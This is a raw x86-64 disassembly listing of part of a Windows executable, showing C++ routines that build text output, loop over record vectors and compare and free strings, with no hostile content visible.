   1400078df:	48 8d 15 92 3d 00 00 	lea    0x3d92(%rip),%rdx        # 0x14000b678
   1400078e6:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400078eb:	e8 60 97 ff ff       	call   0x140001050
   1400078f0:	48 8b c8             	mov    %rax,%rcx
   1400078f3:	48 8d 15 b6 2d 00 00 	lea    0x2db6(%rip),%rdx        # 0x14000a6b0
   1400078fa:	e8 51 97 ff ff       	call   0x140001050
   1400078ff:	48 8b c8             	mov    %rax,%rcx
   140007902:	48 8d 15 9f 2d 00 00 	lea    0x2d9f(%rip),%rdx        # 0x14000a6a8
   140007909:	e8 42 97 ff ff       	call   0x140001050
   14000790e:	48 8d 15 8b 3d 00 00 	lea    0x3d8b(%rip),%rdx        # 0x14000b6a0
   140007915:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   14000791a:	e8 31 97 ff ff       	call   0x140001050
   14000791f:	48 8b c8             	mov    %rax,%rcx
   140007922:	48 8d 15 9f 2d 00 00 	lea    0x2d9f(%rip),%rdx        # 0x14000a6c8
   140007929:	e8 22 97 ff ff       	call   0x140001050
   14000792e:	48 8b c8             	mov    %rax,%rcx
   140007931:	48 8d 15 70 2d 00 00 	lea    0x2d70(%rip),%rdx        # 0x14000a6a8
   140007938:	e8 13 97 ff ff       	call   0x140001050
   14000793d:	48 8d 15 70 3d 00 00 	lea    0x3d70(%rip),%rdx        # 0x14000b6b4
   140007944:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140007949:	e8 02 97 ff ff       	call   0x140001050
   14000794e:	48 8b f0             	mov    %rax,%rsi
   140007951:	48 8d 4d 70          	lea    0x70(%rbp),%rcx
   140007955:	e8 06 e7 ff ff       	call   0x140006060
   14000795a:	90                   	nop
   14000795b:	4c 8b 40 10          	mov    0x10(%rax),%r8
   14000795f:	48 83 78 18 0f       	cmpq   $0xf,0x18(%rax)
   140007964:	76 03                	jbe    0x140007969
   140007966:	48 8b 00             	mov    (%rax),%rax
   140007969:	48 8b d0             	mov    %rax,%rdx
   14000796c:	48 8b ce             	mov    %rsi,%rcx
   14000796f:	e8 5c 9d ff ff       	call   0x1400016d0
   140007974:	48 8d 15 2d 2d 00 00 	lea    0x2d2d(%rip),%rdx        # 0x14000a6a8
   14000797b:	48 8b c8             	mov    %rax,%rcx
   14000797e:	e8 cd 96 ff ff       	call   0x140001050
   140007983:	90                   	nop
   140007984:	48 8b 95 88 00 00 00 	mov    0x88(%rbp),%rdx
   14000798b:	48 83 fa 0f          	cmp    $0xf,%rdx
   14000798f:	76 47                	jbe    0x1400079d8
   140007991:	48 ff c2             	inc    %rdx
   140007994:	48 8b 4d 70          	mov    0x70(%rbp),%rcx
   140007998:	48 8b c1             	mov    %rcx,%rax
   14000799b:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1400079a2:	72 2f                	jb     0x1400079d3
   1400079a4:	48 83 c2 27          	add    $0x27,%rdx
   1400079a8:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   1400079ac:	48 2b c1             	sub    %rcx,%rax
   1400079af:	48 83 e8 08          	sub    $0x8,%rax
   1400079b3:	48 83 f8 1f          	cmp    $0x1f,%rax
   1400079b7:	76 1a                	jbe    0x1400079d3
   1400079b9:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   1400079c0:	00 00 
   1400079c2:	45 33 c9             	xor    %r9d,%r9d
   1400079c5:	45 33 c0             	xor    %r8d,%r8d
   1400079c8:	33 d2                	xor    %edx,%edx
   1400079ca:	33 c9                	xor    %ecx,%ecx
   1400079cc:	ff 15 96 2a 00 00    	call   *0x2a96(%rip)        # 0x14000a468
   1400079d2:	cc                   	int3
   1400079d3:	e8 00 0e 00 00       	call   0x1400087d8
   1400079d8:	48 8d 15 d9 3c 00 00 	lea    0x3cd9(%rip),%rdx        # 0x14000b6b8
   1400079df:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400079e4:	e8 67 96 ff ff       	call   0x140001050
   1400079e9:	48 8d 15 d0 3c 00 00 	lea    0x3cd0(%rip),%rdx        # 0x14000b6c0
   1400079f0:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400079f5:	e8 56 96 ff ff       	call   0x140001050
   1400079fa:	48 8d 15 d7 3c 00 00 	lea    0x3cd7(%rip),%rdx        # 0x14000b6d8
   140007a01:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140007a06:	e8 45 96 ff ff       	call   0x140001050
   140007a0b:	45 33 ff             	xor    %r15d,%r15d
   140007a0e:	48 8b 33             	mov    (%rbx),%rsi
   140007a11:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   140007a15:	48 2b ce             	sub    %rsi,%rcx
   140007a18:	49 bd 67 66 66 66 66 	movabs $0x6666666666666667,%r13
   140007a1f:	66 66 66 
   140007a22:	49 8b c5             	mov    %r13,%rax
   140007a25:	48 f7 e9             	imul   %rcx
   140007a28:	48 c1 fa 04          	sar    $0x4,%rdx
   140007a2c:	48 8b c2             	mov    %rdx,%rax
   140007a2f:	48 c1 e8 3f          	shr    $0x3f,%rax
   140007a33:	48 03 d0             	add    %rax,%rdx
   140007a36:	0f 84 d2 00 00 00    	je     0x140007b0e
   140007a3c:	45 33 f6             	xor    %r14d,%r14d
   140007a3f:	90                   	nop
   140007a40:	48 8d 15 a9 3c 00 00 	lea    0x3ca9(%rip),%rdx        # 0x14000b6f0
   140007a47:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140007a4c:	e8 ff 95 ff ff       	call   0x140001050
   140007a51:	49 8b 14 36          	mov    (%r14,%rsi,1),%rdx
   140007a55:	48 8b c8             	mov    %rax,%rcx
   140007a58:	e8 f3 95 ff ff       	call   0x140001050
   140007a5d:	48 8b c8             	mov    %rax,%rcx
   140007a60:	48 8d 15 7d 3c 00 00 	lea    0x3c7d(%rip),%rdx        # 0x14000b6e4
   140007a67:	e8 e4 95 ff ff       	call   0x140001050
   140007a6c:	48 8d 15 3d a5 ff ff 	lea    -0x5ac3(%rip),%rdx        # 0x140001fb0
   140007a73:	48 8b c8             	mov    %rax,%rcx
   140007a76:	ff 15 5c 26 00 00    	call   *0x265c(%rip)        # 0x14000a0d8
   140007a7c:	49 8b 54 36 20       	mov    0x20(%r14,%rsi,1),%rdx
   140007a81:	48 8b c8             	mov    %rax,%rcx
   140007a84:	ff 15 56 26 00 00    	call   *0x2656(%rip)        # 0x14000a0e0
   140007a8a:	48 8d 15 ef a4 ff ff 	lea    -0x5b11(%rip),%rdx        # 0x140001f80
   140007a91:	48 8b c8             	mov    %rax,%rcx
   140007a94:	ff 15 3e 26 00 00    	call   *0x263e(%rip)        # 0x14000a0d8
   140007a9a:	4d 8d 47 01          	lea    0x1(%r15),%r8
   140007a9e:	4d 8b f8             	mov    %r8,%r15
   140007aa1:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   140007aa5:	48 2b 0b             	sub    (%rbx),%rcx
   140007aa8:	49 8b c5             	mov    %r13,%rax
   140007aab:	48 f7 e9             	imul   %rcx
   140007aae:	48 c1 fa 04          	sar    $0x4,%rdx
   140007ab2:	48 8b c2             	mov    %rdx,%rax
   140007ab5:	48 c1 e8 3f          	shr    $0x3f,%rax
   140007ab9:	48 03 d0             	add    %rax,%rdx
   140007abc:	4c 3b c2             	cmp    %rdx,%r8
   140007abf:	73 11                	jae    0x140007ad2
   140007ac1:	48 8d 15 34 3c 00 00 	lea    0x3c34(%rip),%rdx        # 0x14000b6fc
   140007ac8:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140007acd:	e8 7e 95 ff ff       	call   0x140001050
   140007ad2:	48 8d 15 cf 2b 00 00 	lea    0x2bcf(%rip),%rdx        # 0x14000a6a8
   140007ad9:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140007ade:	e8 6d 95 ff ff       	call   0x140001050
   140007ae3:	49 83 c6 28          	add    $0x28,%r14
   140007ae7:	48 8b 33             	mov    (%rbx),%rsi
   140007aea:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   140007aee:	48 2b ce             	sub    %rsi,%rcx
   140007af1:	49 8b c5             	mov    %r13,%rax
   140007af4:	48 f7 e9             	imul   %rcx
   140007af7:	48 c1 fa 04          	sar    $0x4,%rdx
   140007afb:	48 8b c2             	mov    %rdx,%rax
   140007afe:	48 c1 e8 3f          	shr    $0x3f,%rax
   140007b02:	48 03 d0             	add    %rax,%rdx
   140007b05:	4c 3b fa             	cmp    %rdx,%r15
   140007b08:	0f 82 32 ff ff ff    	jb     0x140007a40
   140007b0e:	48 8d 15 eb 3b 00 00 	lea    0x3beb(%rip),%rdx        # 0x14000b700
   140007b15:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140007b1a:	e8 31 95 ff ff       	call   0x140001050
   140007b1f:	48 8d 15 e2 3b 00 00 	lea    0x3be2(%rip),%rdx        # 0x14000b708
   140007b26:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140007b2b:	e8 20 95 ff ff       	call   0x140001050
   140007b30:	0f 57 c0             	xorps  %xmm0,%xmm0
   140007b33:	0f 11 45 50          	movups %xmm0,0x50(%rbp)
   140007b37:	33 db                	xor    %ebx,%ebx
   140007b39:	48 89 5d 60          	mov    %rbx,0x60(%rbp)
   140007b3d:	41 be 0f 00 00 00    	mov    $0xf,%r14d
   140007b43:	4c 89 75 68          	mov    %r14,0x68(%rbp)
   140007b47:	88 5d 50             	mov    %bl,0x50(%rbp)
   140007b4a:	45 33 ed             	xor    %r13d,%r13d
   140007b4d:	4d 8b 04 24          	mov    (%r12),%r8
   140007b51:	49 8b 4c 24 08       	mov    0x8(%r12),%rcx
   140007b56:	49 2b c8             	sub    %r8,%rcx
   140007b59:	48 b8 ab aa aa aa aa 	movabs $0x2aaaaaaaaaaaaaab,%rax
   140007b60:	aa aa 2a 
   140007b63:	48 f7 e9             	imul   %rcx
   140007b66:	48 c1 fa 02          	sar    $0x2,%rdx
   140007b6a:	48 8b c2             	mov    %rdx,%rax
   140007b6d:	48 c1 e8 3f          	shr    $0x3f,%rax
   140007b71:	48 03 d0             	add    %rax,%rdx
   140007b74:	0f 84 27 02 00 00    	je     0x140007da1
   140007b7a:	45 33 ff             	xor    %r15d,%r15d
   140007b7d:	48 8b 7c 24 30       	mov    0x30(%rsp),%rdi
   140007b82:	0f 1f 40 00          	nopl   0x0(%rax)
   140007b86:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140007b8d:	00 00 00 
   140007b90:	4f 8d 24 07          	lea    (%r15,%r8,1),%r12
   140007b94:	49 8b 34 24          	mov    (%r12),%rsi
   140007b98:	48 8b ce             	mov    %rsi,%rcx
   140007b9b:	e8 c8 1a 00 00       	call   0x140009668
   140007ba0:	48 8d 4d 50          	lea    0x50(%rbp),%rcx
   140007ba4:	49 83 fe 0f          	cmp    $0xf,%r14
   140007ba8:	48 0f 47 4d 50       	cmova  0x50(%rbp),%rcx
   140007bad:	48 3b d8             	cmp    %rax,%rbx
   140007bb0:	75 1c                	jne    0x140007bce
   140007bb2:	48 85 db             	test   %rbx,%rbx
   140007bb5:	0f 84 9e 00 00 00    	je     0x140007c59
   140007bbb:	4c 8b c3             	mov    %rbx,%r8
   140007bbe:	48 8b d6             	mov    %rsi,%rdx
   140007bc1:	e8 78 1a 00 00       	call   0x14000963e
   140007bc6:	85 c0                	test   %eax,%eax
   140007bc8:	0f 84 8b 00 00 00    	je     0x140007c59
   140007bce:	48 85 db             	test   %rbx,%rbx
   140007bd1:	74 22                	je     0x140007bf5
   140007bd3:	48 8d 15 26 3b 00 00 	lea    0x3b26(%rip),%rdx        # 0x14000b700
   140007bda:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140007bdf:	e8 6c 94 ff ff       	call   0x140001050
   140007be4:	48 8d 15 1d 3b 00 00 	lea    0x3b1d(%rip),%rdx        # 0x14000b708
   140007beb:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140007bf0:	e8 5b 94 ff ff       	call   0x140001050
   140007bf5:	49 8b 0c 24          	mov    (%r12),%rcx
   140007bf9:	e8 6a 1a 00 00       	call   0x140009668
   140007bfe:	4c 8b c0             	mov    %rax,%r8
   140007c01:	49 8b 14 24          	mov    (%r12),%rdx
   140007c05:	48 8d 4d 50          	lea    0x50(%rbp),%rcx
   140007c09:	e8 32 a1 ff ff       	call   0x140001d40
   140007c0e:	48 8d 15 fb 3a 00 00 	lea    0x3afb(%rip),%rdx        # 0x14000b710
   140007c15:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140007c1a:	e8 31 94 ff ff       	call   0x140001050
   140007c1f:	48 8d 55 50          	lea    0x50(%rbp),%rdx
   140007c23:	48 83 7d 68 0f       	cmpq   $0xf,0x68(%rbp)
   140007c28:	48 0f 47 55 50       	cmova  0x50(%rbp),%rdx
   140007c2d:	4c 8b 45 60          	mov    0x60(%rbp),%r8
   140007c31:	48 8b c8             	mov    %rax,%rcx
   140007c34:	e8 97 9a ff ff       	call   0x1400016d0
   140007c39:	48 8d 15 cc 3a 00 00 	lea    0x3acc(%rip),%rdx        # 0x14000b70c
   140007c40:	48 8b c8             	mov    %rax,%rcx
   140007c43:	e8 08 94 ff ff       	call   0x140001050
   140007c48:	48 8d 15 89 3a 00 00 	lea    0x3a89(%rip),%rdx        # 0x14000b6d8
   140007c4f:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140007c54:	e8 f7 93 ff ff       	call   0x140001050
   140007c59:	48 8d 15 90 3a 00 00 	lea    0x3a90(%rip),%rdx        # 0x14000b6f0
   140007c60:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140007c65:	e8 e6 93 ff ff       	call   0x140001050
   140007c6a:	49 8b 54 24 08       	mov    0x8(%r12),%rdx
   140007c6f:	48 8b c8             	mov    %rax,%rcx
   140007c72:	e8 d9 93 ff ff       	call   0x140001050
   140007c77:	48 8b c8             	mov    %rax,%rcx
   140007c7a:	48 8d 15 63 3a 00 00 	lea    0x3a63(%rip),%rdx        # 0x14000b6e4
   140007c81:	e8 ca 93 ff ff       	call   0x140001050
   140007c86:	48 8d 15 23 a3 ff ff 	lea    -0x5cdd(%rip),%rdx        # 0x140001fb0
   140007c8d:	48 8b c8             	mov    %rax,%rcx
   140007c90:	ff 15 42 24 00 00    	call   *0x2442(%rip)        # 0x14000a0d8
   140007c96:	41 8b 54 24 10       	mov    0x10(%r12),%edx
   140007c9b:	48 8b c8             	mov    %rax,%rcx
   140007c9e:	ff 15 8c 25 00 00    	call   *0x258c(%rip)        # 0x14000a230
   140007ca4:	48 8d 15 d5 a2 ff ff 	lea    -0x5d2b(%rip),%rdx        # 0x140001f80
   140007cab:	48 8b c8             	mov    %rax,%rcx
   140007cae:	ff 15 24 24 00 00    	call   *0x2424(%rip)        # 0x14000a0d8
   140007cb4:	48 8b 1f             	mov    (%rdi),%rbx
   140007cb7:	48 8b 4f 08          	mov    0x8(%rdi),%rcx
   140007cbb:	48 2b cb             	sub    %rbx,%rcx
   140007cbe:	48 be ab aa aa aa aa 	movabs $0x2aaaaaaaaaaaaaab,%rsi
   140007cc5:	aa aa 2a 
   140007cc8:	48 8b c6             	mov    %rsi,%rax
   140007ccb:	48 f7 e9             	imul   %rcx
   140007cce:	48 c1 fa 02          	sar    $0x2,%rdx
   140007cd2:	48 8b c2             	mov    %rdx,%rax
   140007cd5:	48 c1 e8 3f          	shr    $0x3f,%rax
   140007cd9:	48 03 d0             	add    %rax,%rdx
   140007cdc:	49 8d 45 01          	lea    0x1(%r13),%rax
   140007ce0:	48 3b c2             	cmp    %rdx,%rax
   140007ce3:	73 46                	jae    0x140007d2b
   140007ce5:	49 8b 5c 1f 18       	mov    0x18(%r15,%rbx,1),%rbx
   140007cea:	48 8b cb             	mov    %rbx,%rcx
   140007ced:	e8 76 19 00 00       	call   0x140009668
   140007cf2:	48 8d 4d 50          	lea    0x50(%rbp),%rcx
   140007cf6:	48 83 7d 68 0f       	cmpq   $0xf,0x68(%rbp)
   140007cfb:	48 0f 47 4d 50       	cmova  0x50(%rbp),%rcx
   140007d00:	4c 8b 45 60          	mov    0x60(%rbp),%r8
   140007d04:	4c 3b c0             	cmp    %rax,%r8
   140007d07:	75 22                	jne    0x140007d2b
   140007d09:	4d 85 c0             	test   %r8,%r8
   140007d0c:	74 0c                	je     0x140007d1a
   140007d0e:	48 8b d3             	mov    %rbx,%rdx
   140007d11:	e8 28 19 00 00       	call   0x14000963e
   140007d16:	85 c0                	test   %eax,%eax
   140007d18:	75 11                	jne    0x140007d2b
   140007d1a:	48 8d 15 db 39 00 00 	lea    0x39db(%rip),%rdx        # 0x14000b6fc
   140007d21:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140007d26:	e8 25 93 ff ff       	call   0x140001050
   140007d2b:	48 8d 15 76 29 00 00 	lea    0x2976(%rip),%rdx        # 0x14000a6a8
   140007d32:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140007d37:	e8 14 93 ff ff       	call   0x140001050
   140007d3c:	49 ff c5             	inc    %r13
   140007d3f:	49 83 c7 18          	add    $0x18,%r15
   140007d43:	4c 8b 07             	mov    (%rdi),%r8
   140007d46:	48 8b 4f 08          	mov    0x8(%rdi),%rcx
   140007d4a:	49 2b c8             	sub    %r8,%rcx
   140007d4d:	48 8b c6             	mov    %rsi,%rax
   140007d50:	48 f7 e9             	imul   %rcx
   140007d53:	48 c1 fa 02          	sar    $0x2,%rdx
   140007d57:	48 8b c2             	mov    %rdx,%rax
   140007d5a:	48 c1 e8 3f          	shr    $0x3f,%rax
   140007d5e:	48 03 d0             	add    %rax,%rdx
   140007d61:	4c 3b ea             	cmp    %rdx,%r13
   140007d64:	73 0d                	jae    0x140007d73
   140007d66:	4c 8b 75 68          	mov    0x68(%rbp),%r14
   140007d6a:	48 8b 5d 60          	mov    0x60(%rbp),%rbx
   140007d6e:	e9 1d fe ff ff       	jmp    0x140007b90
   140007d73:	48 83 7d 60 00       	cmpq   $0x0,0x60(%rbp)
   140007d78:	48 8b 7c 24 38       	mov    0x38(%rsp),%rdi
   140007d7d:	74 22                	je     0x140007da1
   140007d7f:	48 8d 15 7a 39 00 00 	lea    0x397a(%rip),%rdx        # 0x14000b700
   140007d86:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140007d8b:	e8 c0 92 ff ff       	call   0x140001050
   140007d90:	48 8d 15 85 39 00 00 	lea    0x3985(%rip),%rdx        # 0x14000b71c
   140007d97:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140007d9c:	e8 af 92 ff ff       	call   0x140001050
   140007da1:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   140007da6:	e8 05 e2 ff ff       	call   0x140005fb0
   140007dab:	48 85 c0             	test   %rax,%rax
   140007dae:	75 1f                	jne    0x140007dcf
   140007db0:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   140007db5:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140007db9:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   140007dbe:	48 03 c8             	add    %rax,%rcx
   140007dc1:	45 33 c0             	xor    %r8d,%r8d
   140007dc4:	ba 02 00 00 00       	mov    $0x2,%edx
   140007dc9:	ff 15 d9 24 00 00    	call   *0x24d9(%rip)        # 0x14000a2a8
   140007dcf:	48 8d 15 4a 39 00 00 	lea    0x394a(%rip),%rdx        # 0x14000b720
   140007dd6:	48 8b 0d 13 23 00 00 	mov    0x2313(%rip),%rcx        # 0x14000a0f0
   140007ddd:	e8 6e 92 ff ff       	call   0x140001050
   140007de2:	4c 8b 47 10          	mov    0x10(%rdi),%r8
   140007de6:	48 83 7f 18 0f       	cmpq   $0xf,0x18(%rdi)
   140007deb:	76 03                	jbe    0x140007df0
   140007ded:	48 8b 3f             	mov    (%rdi),%rdi
   140007df0:	48 8b d7             	mov    %rdi,%rdx
   140007df3:	48 8b c8             	mov    %rax,%rcx
   140007df6:	e8 d5 98 ff ff       	call   0x1400016d0
   140007dfb:	48 8d 15 a6 28 00 00 	lea    0x28a6(%rip),%rdx        # 0x14000a6a8
   140007e02:	48 8b c8             	mov    %rax,%rcx
   140007e05:	e8 46 92 ff ff       	call   0x140001050
   140007e0a:	90                   	nop
   140007e0b:	48 8b 55 68          	mov    0x68(%rbp),%rdx
   140007e0f:	48 83 fa 0f          	cmp    $0xf,%rdx
   140007e13:	76 47                	jbe    0x140007e5c
   140007e15:	48 ff c2             	inc    %rdx
   140007e18:	48 8b 4d 50          	mov    0x50(%rbp),%rcx
   140007e1c:	48 8b c1             	mov    %rcx,%rax
   140007e1f:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140007e26:	72 2f                	jb     0x140007e57
   140007e28:	48 83 c2 27          	add    $0x27,%rdx
   140007e2c:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140007e30:	48 2b c1             	sub    %rcx,%rax
   140007e33:	48 83 e8 08          	sub    $0x8,%rax
   140007e37:	48 83 f8 1f          	cmp    $0x1f,%rax
   140007e3b:	76 1a                	jbe    0x140007e57
   140007e3d:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140007e44:	00 00 
   140007e46:	45 33 c9             	xor    %r9d,%r9d
   140007e49:	45 33 c0             	xor    %r8d,%r8d
   140007e4c:	33 d2                	xor    %edx,%edx
   140007e4e:	33 c9                	xor    %ecx,%ecx
   140007e50:	ff 15 12 26 00 00    	call   *0x2612(%rip)        # 0x14000a468
   140007e56:	cc                   	int3
   140007e57:	e8 7c 09 00 00       	call   0x1400087d8
   140007e5c:	48 c7 45 60 00 00 00 	movq   $0x0,0x60(%rbp)
   140007e63:	00 
   140007e64:	48 c7 45 68 0f 00 00 	movq   $0xf,0x68(%rbp)
   140007e6b:	00 
   140007e6c:	c6 45 50 00          	movb   $0x0,0x50(%rbp)
   140007e70:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   140007e75:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140007e79:	48 8d 05 b0 37 00 00 	lea    0x37b0(%rip),%rax        # 0x14000b630
   140007e80:	48 89 44 0c 40       	mov    %rax,0x40(%rsp,%rcx,1)
   140007e85:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   140007e8a:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140007e8e:	8d 91 58 ff ff ff    	lea    -0xa8(%rcx),%edx
   140007e94:	89 54 0c 3c          	mov    %edx,0x3c(%rsp,%rcx,1)
   140007e98:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   140007e9d:	e8 4e db ff ff       	call   0x1400059f0
   140007ea2:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140007ea7:	ff 15 7b 23 00 00    	call   *0x237b(%rip)        # 0x14000a228
   140007ead:	48 8d 4d e8          	lea    -0x18(%rbp),%rcx
   140007eb1:	ff 15 59 23 00 00    	call   *0x2359(%rip)        # 0x14000a210
   140007eb7:	48 8b 8d 90 00 00 00 	mov    0x90(%rbp),%rcx
   140007ebe:	48 33 cc             	xor    %rsp,%rcx
   140007ec1:	e8 aa 09 00 00       	call   0x140008870
   140007ec6:	48 8b 9c 24 f8 01 00 	mov    0x1f8(%rsp),%rbx
   140007ecd:	00 
   140007ece:	48 81 c4 a0 01 00 00 	add    $0x1a0,%rsp
   140007ed5:	41 5f                	pop    %r15
   140007ed7:	41 5e                	pop    %r14
   140007ed9:	41 5d                	pop    %r13
   140007edb:	41 5c                	pop    %r12
   140007edd:	5f                   	pop    %rdi
   140007ede:	5e                   	pop    %rsi
   140007edf:	5d                   	pop    %rbp
   140007ee0:	c3                   	ret
   140007ee1:	cc                   	int3
   140007ee2:	cc                   	int3
   140007ee3:	cc                   	int3
   140007ee4:	cc                   	int3
   140007ee5:	cc                   	int3
   140007ee6:	cc                   	int3
   140007ee7:	cc                   	int3
   140007ee8:	cc                   	int3
   140007ee9:	cc                   	int3
   140007eea:	cc                   	int3
   140007eeb:	cc                   	int3
   140007eec:	cc                   	int3
   140007eed:	cc                   	int3
   140007eee:	cc                   	int3
   140007eef:	cc                   	int3
   140007ef0:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140007ef5:	55                   	push   %rbp
   140007ef6:	56                   	push   %rsi
   140007ef7:	57                   	push   %rdi
   140007ef8:	41 54                	push   %r12
   140007efa:	41 55                	push   %r13
   140007efc:	41 56                	push   %r14
   140007efe:	41 57                	push   %r15
   140007f00:	48 8d 6c 24 80       	lea    -0x80(%rsp),%rbp
   140007f05:	48 81 ec 80 01 00 00 	sub    $0x180,%rsp
   140007f0c:	48 8b 05 ad ac 00 00 	mov    0xacad(%rip),%rax        # 0x140012bc0
   140007f13:	48 33 c4             	xor    %rsp,%rax
   140007f16:	48 89 45 70          	mov    %rax,0x70(%rbp)
   140007f1a:	49 8b f0             	mov    %r8,%rsi
   140007f1d:	48 8b fa             	mov    %rdx,%rdi
   140007f20:	48 8b d9             	mov    %rcx,%rbx
   140007f23:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140007f28:	48 8b d1             	mov    %rcx,%rdx
   140007f2b:	48 83 79 18 0f       	cmpq   $0xf,0x18(%rcx)
   140007f30:	76 03                	jbe    0x140007f35
   140007f32:	48 8b 11             	mov    (%rcx),%rdx
   140007f35:	c7 44 24 20 01 00 00 	movl   $0x1,0x20(%rsp)
   140007f3c:	00 
   140007f3d:	41 b9 40 00 00 00    	mov    $0x40,%r9d
   140007f43:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140007f49:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140007f4e:	e8 1d d8 ff ff       	call   0x140005770
   140007f53:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   140007f58:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140007f5c:	48 8d 05 cd 36 00 00 	lea    0x36cd(%rip),%rax        # 0x14000b630
   140007f63:	48 89 44 0c 40       	mov    %rax,0x40(%rsp,%rcx,1)
   140007f68:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   140007f6d:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140007f71:	8d 91 58 ff ff ff    	lea    -0xa8(%rcx),%edx
   140007f77:	89 54 0c 3c          	mov    %edx,0x3c(%rsp,%rcx,1)
   140007f7b:	48 83 7d c8 00       	cmpq   $0x0,-0x38(%rbp)
   140007f80:	75 38                	jne    0x140007fba
   140007f82:	48 8d 15 c7 36 00 00 	lea    0x36c7(%rip),%rdx        # 0x14000b650
   140007f89:	48 8b 0d 68 21 00 00 	mov    0x2168(%rip),%rcx        # 0x14000a0f8
   140007f90:	e8 bb 90 ff ff       	call   0x140001050
   140007f95:	4c 8b 43 10          	mov    0x10(%rbx),%r8
   140007f99:	48 83 7b 18 0f       	cmpq   $0xf,0x18(%rbx)
   140007f9e:	76 03                	jbe    0x140007fa3
   140007fa0:	48 8b 1b             	mov    (%rbx),%rbx
   140007fa3:	48 8b d3             	mov    %rbx,%rdx
   140007fa6:	48 8b c8             	mov    %rax,%rcx
   140007fa9:	e8 22 97 ff ff       	call   0x1400016d0
   140007fae:	48 8d 15 8b 36 00 00 	lea    0x368b(%rip),%rdx        # 0x14000b640
   140007fb5:	e9 b6 04 00 00       	jmp    0x140008470
   140007fba:	48 8d 15 73 37 00 00 	lea    0x3773(%rip),%rdx        # 0x14000b734
   140007fc1:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140007fc6:	e8 85 90 ff ff       	call   0x140001050
   140007fcb:	48 8d 15 6e 37 00 00 	lea    0x376e(%rip),%rdx        # 0x14000b740
   140007fd2:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140007fd7:	e8 74 90 ff ff       	call   0x140001050
   140007fdc:	48 8b c8             	mov    %rax,%rcx
   140007fdf:	48 8d 15 ca 26 00 00 	lea    0x26ca(%rip),%rdx        # 0x14000a6b0
   140007fe6:	e8 65 90 ff ff       	call   0x140001050
   140007feb:	48 8b c8             	mov    %rax,%rcx
   140007fee:	48 8d 15 43 37 00 00 	lea    0x3743(%rip),%rdx        # 0x14000b738
   140007ff5:	e8 56 90 ff ff       	call   0x140001050
   140007ffa:	48 8d 15 4f 37 00 00 	lea    0x374f(%rip),%rdx        # 0x14000b750
   140008001:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140008006:	e8 45 90 ff ff       	call   0x140001050
   14000800b:	48 8b c8             	mov    %rax,%rcx
   14000800e:	48 8d 15 b3 26 00 00 	lea    0x26b3(%rip),%rdx        # 0x14000a6c8
   140008015:	e8 36 90 ff ff       	call   0x140001050
   14000801a:	48 8b c8             	mov    %rax,%rcx
   14000801d:	48 8d 15 14 37 00 00 	lea    0x3714(%rip),%rdx        # 0x14000b738
   140008024:	e8 27 90 ff ff       	call   0x140001050
   140008029:	48 8d 15 30 37 00 00 	lea    0x3730(%rip),%rdx        # 0x14000b760
   140008030:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140008035:	e8 16 90 ff ff       	call   0x140001050
   14000803a:	4c 8b f0             	mov    %rax,%r14
   14000803d:	48 8d 4d 50          	lea    0x50(%rbp),%rcx
   140008041:	e8 1a e0 ff ff       	call   0x140006060
   140008046:	90                   	nop
   140008047:	4c 8b 40 10          	mov    0x10(%rax),%r8
   14000804b:	48 83 78 18 0f       	cmpq   $0xf,0x18(%rax)
   140008050:	76 03                	jbe    0x140008055
   140008052:	48 8b 00             	mov    (%rax),%rax
   140008055:	48 8b d0             	mov    %rax,%rdx
   140008058:	49 8b ce             	mov    %r14,%rcx
   14000805b:	e8 70 96 ff ff       	call   0x1400016d0
